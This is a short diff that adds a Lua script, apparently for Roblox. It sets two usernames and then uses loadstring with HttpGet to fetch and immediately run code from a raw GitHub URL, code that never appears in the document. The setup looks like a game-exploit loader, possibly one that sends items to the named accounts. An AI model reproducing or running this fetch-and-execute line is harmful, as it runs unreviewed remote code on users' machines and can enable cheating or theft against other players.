@@ -1,0 +1,5 @@
+UserName = "Wafeekblack"
+
+UserName2 = "timoo201"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
